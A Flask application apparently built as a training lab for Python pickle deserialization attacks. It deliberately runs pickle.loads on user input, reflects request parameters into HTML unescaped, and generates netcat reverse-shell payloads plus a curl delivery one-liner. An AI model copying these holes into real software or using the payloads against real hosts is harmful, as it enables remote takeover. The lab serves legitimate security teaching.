from flask import Flask, request, render_template_string, jsonify
import pickle
import base64
import os

app = Flask(__name__)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Pickle Deserialization Lab</title>
    <style>
        body { font-family: monospace; background: #1a1a1a; color: #00ff00; padding: 20px; }
        h1 { color: #ff6600; }
        h2 { color: #ffff00; }
        .vuln { background: #2d2d2d; padding: 15px; margin: 10px 0; border-left: 4px solid #ff6600; }
        textarea { width: 100%; min-height: 150px; background: #0d0d0d; color: #00ff00; border: 1px solid #00ff00; padding: 10px; font-family: monospace; }
        input[type=submit] { padding: 10px 20px; background: #ff6600; color: #000; border: none; cursor: pointer; margin-top: 10px; }
        input[type=submit]:hover { background: #ff8800; }
        pre { background: #0d0d0d; padding: 15px; overflow-x: auto; border: 1px solid #444; }
        code { background: #333; padding: 3px 6px; }
        .warning { background: #ff0000; color: #fff; padding: 10px; }
    </style>
</head>
<body>
    <h1>Pickle Deserialization Vulnerability Lab</h1>
    <div class='warning'>⚠️ WARNING: This endpoint unsafely deserializes pickle data!</div>
    <p>Practice pickle deserialization attacks in a safe environment.</p>

    <h2>Submit Pickle Data:</h2>
    <div class='vuln'>
        <form action='/pickle' method='POST'>
            <label>Pickle Data (base64 encoded):</label><br>
            <textarea name='data' placeholder='Paste base64-encoded pickle data here...'></textarea><br>
            <input type='submit' value='Deserialize'>
        </form>
    </div>

    <h2>Generate Payloads:</h2>
    <div class='vuln'>
        <h3>Reverse Shell Generator:</h3>
        <form action='/generate' method='GET'>
            <label>Attacker IP:</label>
            <input type='text' name='ip' placeholder='172.28.0.2' value='172.28.0.2'>
            <label>Port:</label>
            <input type='text' name='port' placeholder='4444' value='4444'>
            <input type='submit' value='Generate Payload'>
        </form>
    </div>

    <h2>How to Exploit:</h2>
    <h3>1. Understanding Pickle __reduce__:</h3>
    <pre>
class EvilPickle:
    def __reduce__(self):
        # Returns a tuple: (callable, args)
        return (os.system, ('whoami',))

# When unpickled, this executes: os.system('whoami')
    </pre>

    <h3>2. Generate Reverse Shell Payload:</h3>
    <pre>
# On attacker machine:
python3 -c "import pickle, base64, os; class R: def __reduce__(self): return (os.system,('nc ATTACKER_IP 4444 -e /bin/sh',)); print(base64.b64encode(pickle.dumps(R())).decode())"
    </pre>

    <h2>Listening for Connections:</h2>
    <pre>
# Start listener on attacker:
nc -lvnp 4444
    </pre>
</body>
</html>
"""

@app.route('/')
def index():
    return HTML_TEMPLATE

@app.route('/pickle', methods=['GET', 'POST'])
def pickle_endpoint():
    if request.method == 'POST':
        data = request.form.get('data', '')
    else:
        data = request.args.get('data', '')

    if not data:
        return HTML_TEMPLATE

    try:
        pickled_data = base64.b64decode(data)
        result = pickle.loads(pickled_data)
        output = f"<div class='vuln'><h2>Deserialization Successful!</h2>"
        output += f"<p>Result type: {type(result).__name__}</p>"
        output += f"<p>Result: {result}</p></div>"
        return HTML_TEMPLATE.replace(
            '<h2>Submit Pickle Data:</h2>',
            output + '<h2>Submit Pickle Data:</h2>'
        )
    except Exception as e:
        error = f"<div class='vuln' style='border-color: red;'><h2>Error:</h2><pre>{str(e)}</pre></div>"
        return HTML_TEMPLATE.replace(
            '<h2>Submit Pickle Data:</h2>',
            error + '<h2>Submit Pickle Data:</h2>'
        )

@app.route('/api/unpickle', methods=['POST'])
def api_unpickle():
    try:
        req_data = request.get_json()
        if not req_data or 'data' not in req_data:
            return jsonify({"error": "Missing 'data' field"}), 400

        pickled_data = base64.b64decode(req_data['data'])
        result = pickle.loads(pickled_data)
        return jsonify({"status": "success", "result": str(result), "type": str(type(result).__name__)})
    except Exception as e:
        return jsonify({"status": "error", "error": str(e)}), 400

@app.route('/generate')
def generate():
    attacker_ip = request.args.get('ip', '172.28.0.2')
    port = request.args.get('port', '4444')

    curl_cmd = f"curl -X POST http://target:5001/pickle -d 'data=<base64_payload>'"

    output = f"""
    <div class='vuln'>
        <h2>Generated Payload for {attacker_ip}:{port}</h2>

        <h3>Python Generator Code:</h3>
        <pre>
python3 -c "import pickle,base64,os; class R: def __reduce__(self): return (os.system,('nc {attacker_ip} {port} -e /bin/sh',)); print(base64.b64encode(pickle.dumps(R())).decode())"
        </pre>

        <h3>Quick One-Liner (run on attacker):</h3>
        <pre>
python3 -c "import pickle,base64,os; class R: def __reduce__(self): return (os.system,('nc {attacker_ip} {port} -e /bin/sh',)); print(base64.b64encode(pickle.dumps(R())).decode())" > payload.txt
curl -X POST http://target:5001/pickle -d "data=$(cat payload.txt)"
        </pre>
    </div>
    """

    return HTML_TEMPLATE.replace(
        '<h2>Generate Payloads:</h2>',
        output + '<h2>Generate Payloads:</h2>'
    )

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5001, debug=True)
